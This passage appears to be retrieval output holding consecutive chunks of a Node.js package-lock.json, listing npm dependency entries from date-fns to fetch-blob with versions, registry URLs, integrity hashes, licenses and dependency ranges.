 \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@babel/runtime\": \"^7.21.0\"\n      },\n      \"engines\": {\n        \"node\": \">=0.11\"\n      },\n      \"funding\": {\n        \"type\": \"opencollective\",\n        \"url\": \"https://opencollective.com/date-fns\"\n      }\n    },\n    \"node_modules/dateformat\": {\n      \"version\": \"4.6.3\",\n      \"resolved\": \"https://registry.npmjs.org/dateformat/-/dateformat-4.6.3.tgz\",\n      \"integrity\": \"sha512-2P0p0pFGzHS5EMnhdxQi7aJN+iMheud0UhG4dlE1DLAlvL8JHjJJTX/CSm4JXwV0Ka5nGk3zC5mcb5bUQUxxMA==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \"*\"\n      }\n    },\n    \"node_modules/debug\": {\n      \"version\": \"4.4.3\",\n      \"resolved\": \"https://registry.npmjs.org/debug/-/debug-4.4.3.tgz\",\n      \"integrity\": \"sha512-RGwwWnwQvkVfavKVt22FGLw+xYSdzARwm0ru6DhTVA3umU5hZc28V3kO4stgYryrTlLpuvgI9GiijltAjNbcqA==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"ms\": \"^2.1.3\"\n      },\n      \"engines\": {\n        \"node\": \">=6.0\"\n      },\n      \"peerDependenciesMeta\": {\n        \"supports-color\": {\n          \"optional\": true\n        }\n      }\n    },\n    \"node_modules/decompress-response\": {\n      \"version\": \"6.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/decompress-response/-/decompress-response-6.0.0.tgz\",\n      \"integrity\": \"sha512-aW35yZM6Bb/4oJlZncMH2LCoZtJXTRxES17vE3hoRiowU2kWHaJKFkSBDnDR+cm9J+9QhXmREyIfv0pji9ejCQ==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"mimic-response\": \"^3.1.0\"\n      },\n      \"engines\": {\n        \"node\": \">=10\"\n      },\n      \"funding\": {\n        \"url\": \"https://github.com/sponsors/sindresorhus\"\n      }\n    },\n    \"node_modules/deep-eql\": {\n      \"version\": \"4.1.4\",\n      \"resolved\": \"https://registry.npmjs.org/deep-eql/-/deep-eql-4.1.4.tgz\",\n      \"integrity\": \"sha512-SUwdGfqdKOwxCPeVYjwSyRpJ7Z+fhpwIAtmCUdZIWZ/YP5R9WAsyuSgpLVDi9bjWoN2LXHNss/dk3urXtdQxGg==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"type-detect\": \"^4.0.0\"\n      },\n      \"engines\": {\n        \"node\": \">=6\"\n      }\n    },\n    \"node_modules/deep-extend\": {\n      \"version\": \"0.6.0\",\n      \"resolved\": \"https://registry.npmjs.org/deep-extend/-/deep-extend-0.6.0.tgz\",\n      \"integrity\": \"sha512-LOHxIOaPYdHlJRtCQfDIVZtfw/ufM8+rVj649RIHzcm/vGwQRXFt6OPqIFWsm2XEMrNIEtWR64sY1LEKD2vAOA==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=4.0.0\"\n      }\n    },\n    \"node_modules/delayed-stream\": {\n      \"version\": \"1.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/delayed-stream/-/delayed-stream-1.0.0.tgz\",\n      \"integrity\": \"sha512-ZySD7Nf91aLB0RxL4KGrKHBXl7Eds1DAmEdcoVawXnLD7SDhpNgtuII2aAkg7a7QS41jxPSZ17p4VdGnMHk3MQ==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=0.4.0\"\n      }\n    },\n    \"node_modules/delegates\": {\n      \"version\": \"1.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/delegates/-/delegates-1.0.0.tgz\",\n      \"integrity\": \"sha512-bd2L678uiWATM6m5Z1VzNCErI3jiGzt6HGY8OVICs40JQq/HALfbyNJmp0UDakEY4pMMaN0Ly5om/B1VI/+xfQ==\",\n      \"license\": \"MIT\"\n    },\n    \"node_modules/depd\": {\n      \"version\": \"2.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/depd/-/depd-2.0.0.tgz\",\n      \"integrity\": \"sha512-g7nH6P6dyDioJogAAGprGpCtVImJhpPk/roCzdb3fIh61/s/nPsfR6onyMwkCAR/OlC3yBC0lESvUoQEAssIrw==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">= 0.8\"\n      }\n    },\n    \"node_modules/detect-libc\": {\n      \"version\": \"2.1.2\",\n      \"resolved\": \"https://registry.npmjs.org/detect-libc/-/detect-libc-2.1.2.tgz\",\n      \"integrity\": \"sha512-Btj2BOOO83o3WyH59e8MgXsxEQVcarkUOpEYrubB0urwnN10yQ364rsiByU11nZlqWYZm05i/of7io4mzihBtQ==\",\n      \"license\": \"Apache-2.0\",\n      \"engines\": {\n        \"node\": \">=8\"\n      }\n    },\n    \"node_modules/diff-sequences\": {\n      \"version\": \"29.6.3\",\n      \"resolved\": \"https://registry.npmjs.org/diff-sequences/-/diff-sequences-29.6.3.tgz\",\n      \"integrity\": \"sha512-EjePK1srD3P08o2j4f0ExnylqRs5B9tJjcp9t1krH2qRi8CCdsYfwe9JgSLurFBWwq4uOlipzfk5fHNvwFKr8Q==\",", "metadata": {"file": "package-lock.json", "start_line": 2401, "end_line": 2600, "language": "json"}}, {"corpus": "code", "source": "package-lock.json", "location": "package-lock.json:2601", "score": 0.0, "content": "      \"dev\": true,\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \"^14.15.0 || ^16.10.0 || >=18.0.0\"\n      }\n    },\n    \"node_modules/dotenv\": {\n      \"version\": \"16.6.1\",\n      \"resolved\": \"https://registry.npmjs.org/dotenv/-/dotenv-16.6.1.tgz\",\n      \"integrity\": \"sha512-uBq4egWHTcTt33a72vpSG0z3HnPuIl6NqYcTrKEg2azoEyl2hpW0zqlxysq2pK9HlDIHyHyakeYaYnSAwd8bow==\",\n      \"license\": \"BSD-2-Clause\",\n      \"engines\": {\n        \"node\": \">=12\"\n      },\n      \"funding\": {\n        \"url\": \"https://dotenvx.com\"\n      }\n    },\n    \"node_modules/dunder-proto\": {\n      \"version\": \"1.0.1\",\n      \"resolved\": \"https://registry.npmjs.org/dunder-proto/-/dunder-proto-1.0.1.tgz\",\n      \"integrity\": \"sha512-KIN/nDJBQRcXw0MLVhZE9iQHmG68qAVIBg9CqmUYjmQIhgij9U5MFvrqkUL5FbtyyzZuOeOt0zdeRe4UY7ct+A==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"call-bind-apply-helpers\": \"^1.0.1\",\n        \"es-errors\": \"^1.3.0\",\n        \"gopd\": \"^1.2.0\"\n      },\n      \"engines\": {\n        \"node\": \">= 0.4\"\n      }\n    },\n    \"node_modules/duplexify\": {\n      \"version\": \"4.1.3\",\n      \"resolved\": \"https://registry.npmjs.org/duplexify/-/duplexify-4.1.3.tgz\",\n      \"integrity\": \"sha512-M3BmBhwJRZsSx38lZyhE53Csddgzl5R7xGJNk7CVddZD6CcmwMCH8J+7AprIrQKH7TonKxaCjcv27Qmf+sQ+oA==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"end-of-stream\": \"^1.4.1\",\n        \"inherits\": \"^2.0.3\",\n        \"readable-stream\": \"^3.1.1\",\n        \"stream-shift\": \"^1.0.2\"\n      }\n    },\n    \"node_modules/eastasianwidth\": {\n      \"version\": \"0.2.0\",\n      \"resolved\": \"https://registry.npmjs.org/eastasianwidth/-/eastasianwidth-0.2.0.tgz\",\n      \"integrity\": \"sha512-I88TYZWc9XiYHRQ4/3c5rjjfgkjhLyW2luGIheGERbNQ6OY7yTybanSpDXZa8y7VUP9YmDcYa+eyq4ca7iLqWA==\",\n      \"license\": \"MIT\"\n    },\n    \"node_modules/electron-to-chromium\": {\n      \"version\": \"1.5.279\",\n      \"resolved\": \"https://registry.npmjs.org/electron-to-chromium/-/electron-to-chromium-1.5.279.tgz\",\n      \"integrity\": \"sha512-0bblUU5UNdOt5G7XqGiJtpZMONma6WAfq9vsFmtn9x1+joAObr6x1chfqyxFSDCAFwFhCQDrqeAr6MYdpwJ9Hg==\",\n      \"dev\": true,\n      \"license\": \"ISC\"\n    },\n    \"node_modules/emoji-regex\": {\n      \"version\": \"8.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/emoji-regex/-/emoji-regex-8.0.0.tgz\",\n      \"integrity\": \"sha512-MSjYzcWNOA0ewAHpz0MxpYFvwg6yjy1NG3xteoqz644VCo/RPgnr1/GGt+ic3iJTzQ8Eu3TdM14SawnVUmGE6A==\",\n      \"license\": \"MIT\"\n    },\n    \"node_modules/end-of-stream\": {\n      \"version\": \"1.4.5\",\n      \"resolved\": \"https://registry.npmjs.org/end-of-stream/-/end-of-stream-1.4.5.tgz\",\n      \"integrity\": \"sha512-ooEGc6HP26xXq/N+GCGOT0JKCLDGrq2bQUZrQ7gyrJiZANJ/8YDTxTpQBXGMn+WbIQXNVpyWymm7KYVICQnyOg==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"once\": \"^1.4.0\"\n      }\n    },\n    \"node_modules/es-define-property\": {\n      \"version\": \"1.0.1\",\n      \"resolved\": \"https://registry.npmjs.org/es-define-property/-/es-define-property-1.0.1.tgz\",\n      \"integrity\": \"sha512-e3nRfgfUZ4rNGL232gUgX06QNyyez04KdjFrF+LTRoOXmrOgFKDg4BCdsjW8EnT69eqdYGmRpJwiPVYNrCaW3g==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">= 0.4\"\n      }\n    },\n    \"node_modules/es-errors\": {\n      \"version\": \"1.3.0\",\n      \"resolved\": \"https://registry.npmjs.org/es-errors/-/es-errors-1.3.0.tgz\",\n      \"integrity\": \"sha512-Zf5H2Kxt2xjTvbJvP2ZWLEICxA6j+hAmMzIlypy4xcBg1vKVnx89Wy0GbS+kf5cwCVFFzdCFh2XSCFNULS6csw==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">= 0.4\"\n      }\n    },\n    \"node_modules/es-object-atoms\": {\n      \"version\": \"1.1.1\",\n      \"resolved\": \"https://registry.npmjs.org/es-object-atoms/-/es-object-atoms-1.1.1.tgz\",\n      \"integrity\": \"sha512-FGgH2h8zKNim9ljj7dankFPcICIK9Cp5bm+c2gQSYePhpaG5+esrLODihIorn+Pe6FGJzWhXQotPv73jTaldXA==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"es-errors\": \"^1.3.0\"\n      },\n      \"engines\": {\n        \"node\": \">= 0.4\"\n      }\n    },\n    \"node_modules/es-set-tostringtag\": {\n      \"version\": \"2.1.0\",\n      \"resolved\": \"https://registry.npmjs.org/es-set-tostringtag/-/es-set-tostringtag-2.1.0.tgz\",\n      \"integrity\": \"sha512-j6vWzfrGVfyXxge+O0x5sh6cvxAog0a/4Rdd2K36zCMV5eJ+/+tOAngRO8cODMNWbVRdVlmGZQL2YS3yR8bIUA==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"es-errors\": \"^1.3.0\",\n        \"get-intrinsic\": \"^1.2.6\",\n        \"has-tostringtag\": \"^1.0.2\",\n        \"hasown\": \"^2.0.2\"\n      },\n      \"engines\": {\n        \"node\": \">= 0.4\"\n      }\n    },\n    \"node_modules/esbuild\": {\n      \"version\": \"0.27.2\",\n      \"resolved\": \"https://registry.npmjs.org/esbuild/-/esbuild-0.27.2.tgz\",\n      \"integrity\": \"sha512-HyNQImnsOC7X9PMNaCIeAm4ISCQXs5a5YasTXVliKv4uuBo1dKrG0A+uQS8M5eXjVMnLg3WgXaKvprHlFJQffw==\",\n      \"dev\": true,\n      \"hasInstallScript\": true,\n      \"license\": \"MIT\",\n      \"bin\": {\n        \"esbuild\": \"bin/esbuild\"\n      },\n      \"engines\": {\n        \"node\": \">=18\"\n      },\n      \"optionalDependencies\": {\n        \"@esbuild/aix-ppc64\": \"0.27.2\",\n        \"@esbuild/android-arm\": \"0.27.2\",\n        \"@esbuild/android-arm64\": \"0.27.2\",\n        \"@esbuild/android-x64\": \"0.27.2\",\n        \"@esbuild/darwin-arm64\": \"0.27.2\",\n        \"@esbuild/darwin-x64\": \"0.27.2\",\n        \"@esbuild/freebsd-arm64\": \"0.27.2\",\n        \"@esbuild/freebsd-x64\": \"0.27.2\",\n        \"@esbuild/linux-arm\": \"0.27.2\",\n        \"@esbuild/linux-arm64\": \"0.27.2\",\n        \"@esbuild/linux-ia32\": \"0.27.2\",\n        \"@esbuild/linux-loong64\": \"0.27.2\",\n        \"@esbuild/linux-mips64el\": \"0.27.2\",\n        \"@esbuild/linux-ppc64\": \"0.27.2\",\n        \"@esbuild/linux-riscv64\": \"0.27.2\",\n        \"@esbuild/linux-s390x\": \"0.27.2\",\n        \"@esbuild/linux-x64\": \"0.27.2\",\n        \"@esbuild/netbsd-arm64\": \"0.27.2\",\n        \"@esbuild/netbsd-x64\": \"0.27.2\",\n        \"@esbuild/openbsd-arm64\": \"0.27.2\",\n        \"@esbuild/openbsd-x64\": \"0.27.2\",\n        \"@esbuild/openharmony-arm64\": \"0.27.2\",\n        \"@esbuild/sunos-x64\": \"0.27.2\",\n        \"@esbuild/win32-arm64\": \"0.27.2\",\n        \"@esbuild/win32-ia32\": \"0.27.2\",\n        \"@esbuild/win32-x64\": \"0.27.2\"\n      }\n    },\n    \"node_modules/escalade\": {\n      \"version\": \"3.2.0\",\n      \"resolved\": \"https://registry.npmjs.org/escalade/-/escalade-3.2.0.tgz\",\n      \"integrity\": \"sha512-WUj2qlxaQtO4g6Pq5c29GTcWGDyd8itL8zTlipgECz3JesAiiOKotd8JU6otB3PACgG6xkJUyVhboMS+bje/jA==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=6\"\n      }\n    },\n    \"node_modules/escape-html\": {\n      \"version\": \"1.0.3\",\n      \"resolved\": \"https://registry.npmjs.org/escape-html/-/escape-html-1.0.3.tgz\",\n      \"integrity\": \"sha512-NiSupZ4OeuGwr68lGIeym/ksIZMJodUGOSCZ/FSnTxcrekbvqrgdUxlJOMpijaKZVjAJrWrGs/6Jy8OMuyj9ow==\",\n      \"license\": \"MIT\"\n    },\n    \"node_modules/estree-walker\": {\n      \"version\": \"3.0.3\",\n      \"resolved\": \"https://registry.npmjs.org/estree-walker/-/estree-walker-3.0.3.tgz\",\n      \"integrity\": \"sha512-7RUKfXgSMMkzt6ZuXmqapOurLGPPfgj6l9uRZ7lRGolvk0y2yocc35LdcxKC5PQZdn2DMqioAQ2NoWcrTKmm6g==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@types/estree\": \"^1.0.0\"\n      }\n    },\n    \"node_modules/event-target-shim\": {\n      \"version\": \"5.0.1\",\n      \"resolved\": \"https://registry.npmjs.org/event-target-shim/-/event-target-shim-5.0.1.tgz\",\n      \"integrity\": \"sha512-i/2XbnSz/uxRCU6+NdVJgKWDTM427+MqYbkQzD321DuCQJUqOuJKIA0IM2+W2xtYHdKOmZ4dR6fExsd4SXL+WQ==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=6\"\n      }\n    },\n    \"node_modules/events\": {\n      \"version\": \"3.3.0\",\n      \"resolved\": \"https://registry.npmjs.org/events/-/events-3.3.0.tgz\",\n      \"integrity\": \"sha512-mQw+2fkQbALzQ7V0MY0IqdnXNOeTtP4r0lN9z7AAawCXgqea7bDii20AYrIBrFd/Hx0M2Ocz6S111CaFkUcb0Q==\",\n      \"license\": \"MIT\",\n      \"engines\": {", "metadata": {"file": "package-lock.json", "start_line": 2601, "end_line": 2800, "language": "json"}}, {"corpus": "code", "source": "package-lock.json", "location": "package-lock.json:2801", "score": 0.0, "content": "        \"node\": \">=0.8.x\"\n      }\n    },\n    \"node_modules/execa\": {\n      \"version\": \"8.0.1\",\n      \"resolved\": \"https://registry.npmjs.org/execa/-/execa-8.0.1.tgz\",\n      \"integrity\": \"sha512-VyhnebXciFV2DESc+p6B+y0LjSm0krU4OgJN44qFAhBY0TJ+1V61tYD2+wHusZ6F9n5K+vl8k0sTy7PEfV4qpg==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"cross-spawn\": \"^7.0.3\",\n        \"get-stream\": \"^8.0.1\",\n        \"human-signals\": \"^5.0.0\",\n        \"is-stream\": \"^3.0.0\",\n        \"merge-stream\": \"^2.0.0\",\n        \"npm-run-path\": \"^5.1.0\",\n        \"onetime\": \"^6.0.0\",\n        \"signal-exit\": \"^4.1.0\",\n        \"strip-final-newline\": \"^3.0.0\"\n      },\n      \"engines\": {\n        \"node\": \">=16.17\"\n      },\n      \"funding\": {\n        \"url\": \"https://github.com/sindresorhus/execa?sponsor=1\"\n      }\n    },\n    \"node_modules/expand-template\": {\n      \"version\": \"2.0.3\",\n      \"resolved\": \"https://registry.npmjs.org/expand-template/-/expand-template-2.0.3.tgz\",\n      \"integrity\": \"sha512-XYfuKMvj4O35f/pOXLObndIRvyQ+/+6AhODh+OKWj9S9498pHHn/IMszH+gt0fBCRWMNfk1ZSp5x3AifmnI2vg==\",\n      \"license\": \"(MIT OR WTFPL)\",\n      \"engines\": {\n        \"node\": \">=6\"\n      }\n    },\n    \"node_modules/fast-content-type-parse\": {\n      \"version\": \"1.1.0\",\n      \"resolved\": \"https://registry.npmjs.org/fast-content-type-parse/-/fast-content-type-parse-1.1.0.tgz\",\n      \"integrity\": \"sha512-fBHHqSTFLVnR61C+gltJuE5GkVQMV0S2nqUO8TJ+5Z3qAKG8vAx4FKai1s5jq/inV1+sREynIWSuQ6HgoSXpDQ==\",\n      \"license\": \"MIT\"\n    },\n    \"node_modules/fast-copy\": {\n      \"version\": \"3.0.2\",\n      \"resolved\": \"https://registry.npmjs.org/fast-copy/-/fast-copy-3.0.2.tgz\",\n      \"integrity\": \"sha512-dl0O9Vhju8IrcLndv2eU4ldt1ftXMqqfgN4H1cpmGV7P6jeB9FwpN9a2c8DPGE1Ys88rNUJVYDHq73CGAGOPfQ==\",\n      \"license\": \"MIT\"\n    },\n    \"node_modules/fast-decode-uri-component\": {\n      \"version\": \"1.0.1\",\n      \"resolved\": \"https://registry.npmjs.org/fast-decode-uri-component/-/fast-decode-uri-component-1.0.1.tgz\",\n      \"integrity\": \"sha512-WKgKWg5eUxvRZGwW8FvfbaH7AXSh2cL+3j5fMGzUMCxWBJ3dV3a7Wz8y2f/uQ0e3B6WmodD3oS54jTQ9HVTIIg==\",\n      \"license\": \"MIT\"\n    },\n    \"node_modules/fast-deep-equal\": {\n      \"version\": \"3.1.3\",\n      \"resolved\": \"https://registry.npmjs.org/fast-deep-equal/-/fast-deep-equal-3.1.3.tgz\",\n      \"integrity\": \"sha512-f3qQ9oQy9j2AhBe/H9VC91wLmKBCCU/gDOnKNAYG5hswO7BLKj09Hc5HYNz9cGI++xlpDCIgDaitVs03ATR84Q==\",\n      \"license\": \"MIT\"\n    },\n    \"node_modules/fast-json-stringify\": {\n      \"version\": \"5.16.1\",\n      \"resolved\": \"https://registry.npmjs.org/fast-json-stringify/-/fast-json-stringify-5.16.1.tgz\",\n      \"integrity\": \"sha512-KAdnLvy1yu/XrRtP+LJnxbBGrhN+xXu+gt3EUvZhYGKCr3lFHq/7UFJHHFgmJKoqlh6B40bZLEv7w46B0mqn1g==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@fastify/merge-json-schemas\": \"^0.1.0\",\n        \"ajv\": \"^8.10.0\",\n        \"ajv-formats\": \"^3.0.1\",\n        \"fast-deep-equal\": \"^3.1.3\",\n        \"fast-uri\": \"^2.1.0\",\n        \"json-schema-ref-resolver\": \"^1.0.1\",\n        \"rfdc\": \"^1.2.0\"\n      }\n    },\n    \"node_modules/fast-json-stringify/node_modules/ajv-formats\": {\n      \"version\": \"3.0.1\",\n      \"resolved\": \"https://registry.npmjs.org/ajv-formats/-/ajv-formats-3.0.1.tgz\",\n      \"integrity\": \"sha512-8iUql50EUR+uUcdRQ3HDqa6EVyo3docL8g5WJ3FNcWmu62IbkGUue/pEyLBW8VGKKucTPgqeks4fIU1DA4yowQ==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"ajv\": \"^8.0.0\"\n      },\n      \"peerDependencies\": {\n        \"ajv\": \"^8.0.0\"\n      },\n      \"peerDependenciesMeta\": {\n        \"ajv\": {\n          \"optional\": true\n        }\n      }\n    },\n    \"node_modules/fast-querystring\": {\n      \"version\": \"1.1.2\",\n      \"resolved\": \"https://registry.npmjs.org/fast-querystring/-/fast-querystring-1.1.2.tgz\",\n      \"integrity\": \"sha512-g6KuKWmFXc0fID8WWH0jit4g0AGBoJhCkJMb1RmbsSEUNvQ+ZC8D6CUZ+GtF8nMzSPXnhiePyyqqipzNNEnHjg==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"fast-decode-uri-component\": \"^1.0.1\"\n      }\n    },\n    \"node_modules/fast-redact\": {\n      \"version\": \"3.5.0\",\n      \"resolved\": \"https://registry.npmjs.org/fast-redact/-/fast-redact-3.5.0.tgz\",\n      \"integrity\": \"sha512-dwsoQlS7h9hMeYUq1W++23NDcBLV4KqONnITDV9DjfS3q1SgDGVrBdvvTLUotWtPSD7asWDV9/CmsZPy8Hf70A==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=6\"\n      }\n    },\n    \"node_modules/fast-safe-stringify\": {\n      \"version\": \"2.1.1\",\n      \"resolved\": \"https://registry.npmjs.org/fast-safe-stringify/-/fast-safe-stringify-2.1.1.tgz\",\n      \"integrity\": \"sha512-W+KJc2dmILlPplD/H4K9l9LcAHAfPtP6BY84uVLXQ6Evcz9Lcg33Y2z1IVblT6xdY54PXYVHEv+0Wpq8Io6zkA==\",\n      \"license\": \"MIT\"\n    },\n    \"node_modules/fast-uri\": {\n      \"version\": \"2.4.0\",\n      \"resolved\": \"https://registry.npmjs.org/fast-uri/-/fast-uri-2.4.0.tgz\",\n      \"integrity\": \"sha512-ypuAmmMKInk5q7XcepxlnUWDLWv4GFtaJqAzWKqn62IpQ3pejtr5dTVbt3vwqVaMKmkNR55sTT+CqUKIaT21BA==\",\n      \"license\": \"MIT\"\n    },\n    \"node_modules/fastify\": {\n      \"version\": \"4.29.1\",\n      \"resolved\": \"https://registry.npmjs.org/fastify/-/fastify-4.29.1.tgz\",\n      \"integrity\": \"sha512-m2kMNHIG92tSNWv+Z3UeTR9AWLLuo7KctC7mlFPtMEVrfjIhmQhkQnT9v15qA/BfVq3vvj134Y0jl9SBje3jXQ==\",\n      \"funding\": [\n        {\n          \"type\": \"github\",\n          \"url\": \"https://github.com/sponsors/fastify\"\n        },\n        {\n          \"type\": \"opencollective\",\n          \"url\": \"https://opencollective.com/fastify\"\n        }\n      ],\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@fastify/ajv-compiler\": \"^3.5.0\",\n        \"@fastify/error\": \"^3.4.0\",\n        \"@fastify/fast-json-stringify-compiler\": \"^4.3.0\",\n        \"abstract-logging\": \"^2.0.1\",\n        \"avvio\": \"^8.3.0\",\n        \"fast-content-type-parse\": \"^1.1.0\",\n        \"fast-json-stringify\": \"^5.8.0\",\n        \"find-my-way\": \"^8.0.0\",\n        \"light-my-request\": \"^5.11.0\",\n        \"pino\": \"^9.0.0\",\n        \"process-warning\": \"^3.0.0\",\n        \"proxy-addr\": \"^2.0.7\",\n        \"rfdc\": \"^1.3.0\",\n        \"secure-json-parse\": \"^2.7.0\",\n        \"semver\": \"^7.5.4\",\n        \"toad-cache\": \"^3.3.0\"\n      }\n    },\n    \"node_modules/fastify-plugin\": {\n      \"version\": \"4.5.1\",\n      \"resolved\": \"https://registry.npmjs.org/fastify-plugin/-/fastify-plugin-4.5.1.tgz\",\n      \"integrity\": \"sha512-stRHYGeuqpEZTL1Ef0Ovr2ltazUT9g844X5z/zEBFLG8RYlpDiOCIG+ATvYEp+/zmc7sN29mcIMp8gvYplYPIQ==\",\n      \"license\": \"MIT\"\n    },\n    \"node_modules/fastify/node_modules/@fastify/error\": {\n      \"version\": \"3.4.1\",\n      \"resolved\": \"https://registry.npmjs.org/@fastify/error/-/error-3.4.1.tgz\",\n      \"integrity\": \"sha512-wWSvph+29GR783IhmvdwWnN4bUxTD01Vm5Xad4i7i1VuAOItLvbPAb69sb0IQ2N57yprvhNIwAP5B6xfKTmjmQ==\",\n      \"license\": \"MIT\"\n    },\n    \"node_modules/fastify/node_modules/pino\": {\n      \"version\": \"9.14.0\",\n      \"resolved\": \"https://registry.npmjs.org/pino/-/pino-9.14.0.tgz\",\n      \"integrity\": \"sha512-8OEwKp5juEvb/MjpIc4hjqfgCNysrS94RIOMXYvpYCdm/jglrKEiAYmiumbmGhCvs+IcInsphYDFwqrjr7398w==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@pinojs/redact\": \"^0.4.0\",\n        \"atomic-sleep\": \"^1.0.0\",\n        \"on-exit-leak-free\": \"^2.1.0\",\n        \"pino-abstract-transport\": \"^2.0.0\",\n        \"pino-std-serializers\": \"^7.0.0\",\n        \"process-warning\": \"^5.0.0\",\n        \"quick-format-unescaped\": \"^4.0.3\",\n        \"real-require\": \"^0.2.0\",\n        \"safe-stable-stringify\": \"^2.3.1\",\n        \"sonic-boom\": \"^4.0.1\",\n        \"thread-stream\": \"^3.0.0\"\n      },\n      \"bin\": {\n        \"pino\": \"bin.js\"\n      }\n    },\n    \"node_modules/fastify/node_modules/pino-abstract-transport\": {\n      \"version\": \"2.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/pino-abstract-transport/-/pino-abstract-transport-2.0.0.tgz\",\n      \"integrity\": \"sha512-F63x5tizV6WCh4R6RHyi2Ml+M70DNRXt/+HANowMflpgGFMAym/VKm6G7ZOQRjqN7XbGxK1Lg9t6ZrtzOaivMw==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"split2\": \"^4.0.0\"\n      }\n    },\n    \"node_modules/fastify/node_modules/pino-std-serializers\": {", "metadata": {"file": "package-lock.json", "start_line": 2801, "end_line": 3000, "language": "json"}}, {"corpus": "code", "source": "package-lock.json", "location": "package-lock.json:3001", "score": 0.0, "content": "      \"version\": \"7.1.0\",\n      \"resolved\": \"https://registry.npmjs.org/pino-std-serializers/-/pino-std-serializers-7.1.0.tgz\",\n      \"integrity\": \"sha512-BndPH67/JxGExRgiX1dX0w1FvZck5Wa4aal9198SrRhZjH3GxKQUKIBnYJTdj2HDN3UQAS06HlfcSbQj2OHmaw==\",\n      \"license\": \"MIT\"\n    },\n    \"node_modules/fastify/node_modules/pino/node_modules/process-warning\": {\n      \"version\": \"5.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/process-warning/-/process-warning-5.0.0.tgz\",\n      \"integrity\": \"sha512-a39t9ApHNx2L4+HBnQKqxxHNs1r7KF+Intd8Q/g1bUh6q0WIp9voPXJ/x0j+ZL45KF1pJd9+q2jLIRMfvEshkA==\",\n      \"funding\": [\n        {\n          \"type\": \"github\",\n          \"url\": \"https://github.com/sponsors/fastify\"\n        },\n        {\n          \"type\": \"opencollective\",\n          \"url\": \"https://opencollective.com/fastify\"\n        }\n      ],\n      \"license\": \"MIT\"\n    },\n    \"node_modules/fastify/node_modules/semver\": {\n      \"version\": \"7.7.3\",\n      \"resolved\": \"https://registry.npmjs.org/semver/-/semver-7.7.3.tgz\",\n      \"integrity\": \"sha512-SdsKMrI9TdgjdweUSR9MweHA4EJ8YxHn8DFaDisvhVlUOe4BF1tLD7GAj0lIqWVl+dPb/rExr0Btby5loQm20Q==\",\n      \"license\": \"ISC\",\n      \"bin\": {\n        \"semver\": \"bin/semver.js\"\n      },\n      \"engines\": {\n        \"node\": \">=10\"\n      }\n    },\n    \"node_modules/fastify/node_modules/sonic-boom\": {\n      \"version\": \"4.2.0\",\n      \"resolved\": \"https://registry.npmjs.org/sonic-boom/-/sonic-boom-4.2.0.tgz\",\n      \"integrity\": \"sha512-INb7TM37/mAcsGmc9hyyI6+QR3rR1zVRu36B0NeGXKnOOLiZOfER5SA+N7X7k3yUYRzLWafduTDvJAfDswwEww==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"atomic-sleep\": \"^1.0.0\"\n      }\n    },\n    \"node_modules/fastify/node_modules/thread-stream\": {\n      \"version\": \"3.1.0\",\n      \"resolved\": \"https://registry.npmjs.org/thread-stream/-/thread-stream-3.1.0.tgz\",\n      \"integrity\": \"sha512-OqyPZ9u96VohAyMfJykzmivOrY2wfMSf3C5TtFJVgN+Hm6aj+voFhlK+kZEIv2FBh1X6Xp3DlnCOfEQ3B2J86A==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"real-require\": \"^0.2.0\"\n      }\n    },\n    \"node_modules/fastq\": {\n      \"version\": \"1.20.1\",\n      \"resolved\": \"https://registry.npmjs.org/fastq/-/fastq-1.20.1.tgz\",\n      \"integrity\": \"sha512-GGToxJ/w1x32s/D2EKND7kTil4n8OVk/9mycTc4VDza13lOvpUZTGX3mFSCtV9ksdGBVzvsyAVLM6mHFThxXxw==\",\n      \"license\": \"ISC\",\n      \"dependencies\": {\n        \"reusify\": \"^1.0.4\"\n      }\n    },\n    \"node_modules/fetch-blob\": {\n      \"version\": \"3.2.0\",\n      \"resolved\": \"https://registry.npmjs.org/fetch-blob/-/fetch-blob-3.2.0.tgz\",\n      \"integrity\": \"sha512-7yAQpD2UMJzLi1Dqv7qFYnPbaPx7ZfFK6PiIxQ4PfkGPyNyl2Ugx+a/umUonmKqjhM4DnfbMvdX6otXq83soQQ==\",\n      \"funding\": [\n        {\n          \"type\": \"github\",\n          \"url\": \"https://github.com/sponsors/jimmywarting\"\n        },\n        {\n          \"type\": \"paypal\",\n          \"url\": \"https://paypal.me/jimmywarting\"\n        }\n      ],\n      \"license\": \"MIT\",\n      